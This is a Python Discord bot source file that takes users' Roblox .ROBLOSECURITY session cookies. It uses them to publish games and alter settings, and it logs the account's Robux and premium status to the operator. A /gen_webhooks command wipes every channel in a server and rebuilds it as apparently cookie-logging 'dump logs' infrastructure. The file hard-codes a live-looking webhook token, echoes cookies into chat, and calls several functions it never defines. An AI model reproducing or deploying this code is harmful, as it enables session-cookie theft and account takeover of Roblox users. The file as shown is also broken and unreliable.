import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import requests
import aiohttp

# ─── Webserver ─────────────────────────────────────────────
from flask import Flask, render_template_string
from threading import Thread

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bot Status</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            margin-top: 100px;
        }
        h1 {
            font-size: 48px;
            color: #ff4b5c;
        }
        p {
            font-size: 24px;
            color: #c4c4c4;
        }
    </style>
</head>
<body>
    <h1>✅ Bot is Online!</h1>
    <p>Everything is working perfectly.</p>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML)

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = Thread(target=run_web)
    t.start()

# ─── Logging Function ─────────────────────────────────────
WEBHOOK_URL = "https://discord.com/api/webhooks/1376233098425008250/i6ZXytOzw8EgNdi7YQgmhm3eifKS2pamN-iVF-nzifBZXt3w16N5SgR7Z4fiRy0sqXlI"  # Put your webhook URL here
LOG_CHANNEL_ID = 1365305515189473375  # Replace with your logs channel ID (int)

async def log_command_usage(interaction: discord.Interaction, command_name: str):
    embed = discord.Embed(
        title="📌 Command Used",
        color=discord.Color.blurple(),
        timestamp=interaction.created_at
    )
    embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
    embed.add_field(name="Command", value=f"`/{command_name}`", inline=False)
    embed.add_field(name="Server", value=f"{interaction.guild.name} (`{interaction.guild.id}`)" if interaction.guild else "DM", inline=False)
    embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)

    # Try send via webhook first
    try:
        async with aiohttp.ClientSession() as session:
            webhook_payload = {
                "embeds": [embed.to_dict()]
            }
            async with session.post(WEBHOOK_URL, json=webhook_payload) as resp:
                if resp.status == 204 or resp.status == 200:
                    print(f"✅ Log sent via webhook successfully.")
                    return
                else:
                    text = await resp.text()
                    print(f"❗ Webhook log send failed (status {resp.status}): {text}")
    except Exception as e:
        print(f"❗ Exception sending webhook log: {e}")

    # Fallback: send to log channel directly
    try:
        log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
        if not log_channel:
            # Try fetching channel if not cached
            log_channel = await interaction.client.fetch_channel(LOG_CHANNEL_ID)
        if log_channel:
            await log_channel.send(embed=embed)
            print(f"✅ Log sent via channel fallback successfully.")
        else:
            print(f"❌ Log channel not found with ID: {LOG_CHANNEL_ID}")
    except Exception as e:
        print(f"❗ Failed to send log message in channel fallback: {e}")

# ─── Discord Bot ─────────────────────────────────────────────────
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"⚡ Synced {len(synced)} slash commands!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# ─── Roblox Set Maturity Command ────────────────────────────────
@bot.tree.command(name="set_maturity", description="Auto set a Roblox game's maturity to Minimal.")
@app_commands.describe(cookie="Your .ROBLOSECURITY cookie", place_id="The Place ID of your game")
async def set_maturity(interaction: discord.Interaction, cookie: str, place_id: str):
    await interaction.response.defer(thinking=True, ephemeral=True)
    await log_command_usage(interaction, "set_maturity")

    try:
        session = requests.Session()
        session.cookies.set(".ROBLOSECURITY", cookie, domain=".roblox.com")
        session.headers.update({
            "User-Agent": "Roblox/WinInet",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com"
        })

        csrf_req = session.post("https://auth.roblox.com/v2/logout")
        csrf_token = csrf_req.headers.get("x-csrf-token")

        if not csrf_token:
            await interaction.followup.send("❌ Could not get CSRF token.", ephemeral=True)
            return

        session.headers.update({"X-CSRF-TOKEN": csrf_token})

        place_info_res = session.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe")
        if place_info_res.status_code != 200:
            await interaction.followup.send(f"❌ Failed to fetch Universe ID: {place_info_res.text}", ephemeral=True)
            return
        
        universe_id = place_info_res.json().get("universeId")
        if not universe_id:
            await interaction.followup.send("❌ Universe ID not found.", ephemeral=True)
            return

        payload = {
            "universeConfiguration": {
                "maturitySettings": {
                    "isMature": False
                }
            }
        }

        patch_url = f"https://apis.roblox.com/universes/v1/{universe_id}/configuration"
        patch_res = session.patch(patch_url, json=payload)

        if patch_res.status_code == 200:
            await interaction.followup.send("✅ Successfully set game maturity to Minimal!", ephemeral=True)
        else:
            await interaction.followup.send(f"❌ Failed to update maturity: {patch_res.text}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

# ─── Webhook Gen Command ─────────────────────────────────────────
@bot.tree.command(name="gen_webhooks", description="Regenerate server with channels and webhooks inside a red embed.")
async def gen_webhooks(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True, ephemeral=True)
    await log_command_usage(interaction, "gen_webhooks")

    guild = interaction.guild
    if not guild:
        await interaction.followup.send("❌ This command can only be used inside a server.", ephemeral=True)
        return

    for channel in guild.channels:
        try:
            if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.VoiceChannel):
                await channel.edit(category=None)
        except Exception as e:
            print(f"❗ Error moving channel {channel.name}: {e}")

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"❗ Error deleting channel {channel.name}: {e}")

    for category in guild.categories:
        try:
            await category.delete()
        except Exception as e:
            print(f"❗ Error deleting category {category.name}: {e}")

    await asyncio.sleep(3)

    structure = {
        "WEBHOOKS": ["【🕸】𝚂𝙰𝚅𝙴𝙳 𝚆𝙴𝙱𝙷𝙾𝙾𝙺"],
        "VISITS": ["【🚪】𝚅𝙸𝚂𝙸𝚃𝚂"],
        "UN VERIFIED": ["【🔓】𝙽𝙱𝙲", "【🔓】𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
        "VERIFIED": ["【🔒】𝚅𝙽𝙱𝙲", "【🔒】𝚅-𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
        "DUMP LOGS": ["【📈】𝚂𝚄𝙲𝙲𝙴𝚂𝚂", "【📉】𝙵𝙰𝙸𝙻𝙴𝙳"],
    }
  
    created_channels = {}
    saved_webhook_channel = None

    for category_name, channels in structure.items():
        category = await guild.create_category(category_name)
        for chan_name in channels:
            channel = await guild.create_text_channel(chan_name, category=category)
            created_channels[chan_name] = channel
            if chan_name == "【🕸】𝚂𝙰𝚅𝙴𝙳 𝚆𝙴𝙱𝙷𝙾𝙾𝙺":
                saved_webhook_channel = channel

    if not saved_webhook_channel:
        await interaction.followup.send("❌ Failed to create the saved webhook channel.", ephemeral=True)
        return

    webhook_embed = discord.Embed(
        title="【🕸】𝚂𝙰𝚅𝙴𝙳 𝚆𝙴𝙱𝙷𝙾𝙾𝙺",
        description="Here are your generated webhooks.",
        color=discord.Color.red()
    )

    for chan_name, channel in created_channels.items():
        if channel.id == saved_webhook_channel.id:
            continue
        try:
            webhook = await channel.create_webhook(name=f"Webhook - {chan_name}")
            webhook_embed.add_field(name=f"#{chan_name}", value=webhook.url, inline=False)
        except Exception as e:
            print(f"❗ Failed to create webhook in {chan_name}: {e}")

    webhook_embed.set_image(
        url="https://fiverr-res.cloudinary.com/images/f_auto,q_auto,t_main1/v1/attachments/delivery/asset/aa0d9d6c8813f5f65a00b2968ce75272-1668785195/Comp_1/do-a-cool-custom-animated-discord-profile-picture-or-banner-50-clients.gif"
    )

    await saved_webhook_channel.send(embed=webhook_embed)
    await interaction.followup.send("✅ Server reset and webhooks generated successfully!", ephemeral=True)

# ─── Create Command ──────────────────────────────────────────────────────
@bot.tree.command(name="create", description="Create a Roblox Game Automatically!")
@app_commands.describe(theme='Create Now!')
@app_commands.choices(theme=theme_choices)

async def slash_publish_new_game(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):

  role_name = os.getenv('CUSTUMER_ROLE_NAME')
  guild_id = int(os.getenv("GUILD_ID"))
  guild = interaction.guild

  if guild is None:
    print(f"Guild not found with ID: {guild_id}")
    return

  member = guild.get_member(interaction.user.id)
  if member is None:
    print(f"Member not found in guild with ID: {guild_id}")
    return

  role = discord.utils.get(guild.roles, name=role_name)
  if role is None or role not in member.roles:

    message = f"Role {role_name} is required to run this command."
    embed_var = discord.Embed(title=message, color=8918293)
    return await interaction.response.send_message(embed=embed_var, ephemeral=True)
      
  message = "Uploading, Please Wait."
  embed_var = discord.Embed(title=message, color=0x000d21)
  await interaction.response.send_message(embed=embed_var, ephemeral=True)

  refreshed_cookie = refresh_cookie(cookie)

  if refreshed_cookie is None:
    message = "Invalid Cookie"
    embed_var = discord.Embed(title=message, color=0x000d21)
    return await interaction.followup.send(embed=embed_var, ephemeral=True)

  try:
      csrf_token = get_csrf_token(refreshed_cookie)
  except Exception as e:
      await interaction.followup.send(f'Oops! Something went wrong: {e}')
  headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": f".ROBLOSECURITY={refreshed_cookie}"
  }

  # Make the GET request
  url = 'https://www.roblox.com/mobileapi/userinfo'
  response = requests.get(url, headers=headers)
  data = response.json()
  try:
    username = data['UserName']
    userid = data['UserID']
    user_robux = data['RobuxBalance']
    user_isprem = data['IsPremium']
    avatarurl = data['ThumbnailUrl']

  except:
    await interaction.followup.send(f'Oops! Something went wrong, {refreshed_cookie}!')


  print(f" [DATA] {userid} - UserID")

  session = requests.Session()
  session.headers.update(
    {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json;charset=utf-8",
      "Origin": "https://www.roblox.com",
    }
  )
  session.cookies[".ROBLOSECURITY"] = refreshed_cookie

  headers1 = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "Roblox/WinInet",
        "X-CSRF-TOKEN": csrf_token,
        "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
  }
  body1 = json.dumps({"templatePlaceId": "379736082"})

  request1 = session.post(
        "https://apis.roblox.com/universes/v1/universes/create",
        headers=headers1,
        data=body1
  )
  code1 = request1.status_code
  Uni_Game_Id = None
  if code1 == 200:
    response_body = request1.json()
    game_id = response_body["rootPlaceId"]
    Uni_Game_Id = response_body["universeId"]
    game_url = f"https://www.roblox.com/games/{game_id}/"

    success_embed = discord.Embed(
        title="Successfully Created",
        description=f"Game has been successfully created.\n[Click here to play!]({game_url})", 
        color=0x000d21
    )

    await interaction.followup.send(embed=success_embed, ephemeral=True)
  else:
    await interaction.followup.send(f"Upload failed with HTTP code {code1}", ephemeral=True)

  print(f" [DATA] {Uni_Game_Id} - Game Uni-ID")
  if Uni_Game_Id is not None:
    headers2 = {
      "Origin": "https://create.roblox.com",
      "X-CSRF-TOKEN": csrf_token,
      "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
    }
    session.post(f"https://develop.roblox.com/v1/universes/{Uni_Game_Id}/activate", headers=headers2)

    gamedata = {
      "name": gamename,
      "description": description,
      "universeAvatarType": "MorphToR6",
      "universeAnimationType": "Standard",
      "maxPlayerCount": 45,
      "allowPrivateServers": False,
      "privateServerPrice": 0,
      "permissions": {
        "IsThirdPartyTeleportAllowed": True,
        "IsThirdPartyPurchaseAllowed": True,
      },
    }
    body2 = json.dumps(gamedata)
    session.patch(
      f"https://develop.roblox.com/v2/universes/{Uni_Game_Id}/configuration",
      headers=headers1,
      data=body2
    )

    uploadRequest = session.post(
    f"https://data.roblox.com/Data/Upload.ashx?assetid={str(game_id)}",
    headers={
      'Content-Type': 'application/xml',
      'x-csrf-token': csrf_token,
      'User-Agent': 'Roblox/WinINet'
    },
    cookies={'.ROBLOSECURITY': refreshed_cookie},
    data=process_file(theme.value))

    print(f" [DATA] {uploadRequest.status_code} - Game Response Code")
    print(f" [DATA] {uploadRequest.content} - Game Response")

    if uploadRequest.status_code == 200:
 
        game_icon = get_game_icon(game_id)

        embed_var = discord.Embed(title="Your Game Has Been Published", description="**SuccessFully Published!**", color=0xfac54d)
        embed_var.add_field(name='**Game Name:**', value='' + str(gamename) + '')
        embed_var.add_field(name='**Description:**', value='' + str(description) + '')
        embed_var.add_field(name='**Game ID:**', value='' + str(game_id) + '')
        embed_var.add_field(name='**Theme:**', value='' + str(theme.name) + '')
        embed_var.add_field(name="**Game Link:**", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
        embed_var.set_footer(text="Your Game Has Been Successfully Published!! - ")
        embed_var.set_thumbnail(url=f"{game_icon}")
        await interaction.followup.send(embed=embed_var, ephemeral=True)
        channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))

        embed_var = discord.Embed(
          title="Electrify Botbased - Published",
          description= f'**<@{interaction.user.id}> Successfully Uploaded A New Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
          color=0xfac54d
        )
        embed_var.set_thumbnail(url=f'{avatarurl}')

        embed_var.set_footer(text="Game has been successfully published")
        await channel.send(embed=embed_var)
  else:
        message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
        embed_var = discord.Embed(title=message2, color=0x000d21)
        await interaction.followup.send(embed=embed_var, ephemeral=True)

# ─── Help Command ──────────────────────────────────────────────────────
@bot.tree.command(name="help", description="Show a list of all commands and descriptions.")
async def help_command(interaction: discord.Interaction):
    await interaction.response.defer(thinking=False, ephemeral=True)
    await log_command_usage(interaction, "help")

    help_embed = discord.Embed(
        title="🛠️ Command List",
        description="Here are the available commands you can use:",
        color=discord.Color.dark_gold()
    )

    help_embed.add_field(
        name="/set_maturity",
        value="🔧 Automatically sets a Roblox game's maturity to **Minimal**.\nRequires your `.ROBLOSECURITY` cookie and the game's **Place ID**.",
        inline=False
    )

    help_embed.add_field(
        name="/gen_webhooks",
        value="🧹 Wipes the server channels, recreates a structured layout, and auto-generates webhooks inside a red embed.",
        inline=False
    )

    help_embed.add_field(
        name="/help",
        value="📘 Displays this help menu with a list of available commands.",
        inline=False
    )

    help_embed.set_footer(text=" Owner Arzconic Mgui | Use commands wisely.")
    help_embed.set_thumbnail(url="https://i.imgur.com/5cX1G98.png")

    await interaction.followup.send(embed=help_embed, ephemeral=True)

# ─── Start everything ─────────────────────────────────────────────────
keep_alive()
bot.run(os.getenv("TOKEN"))
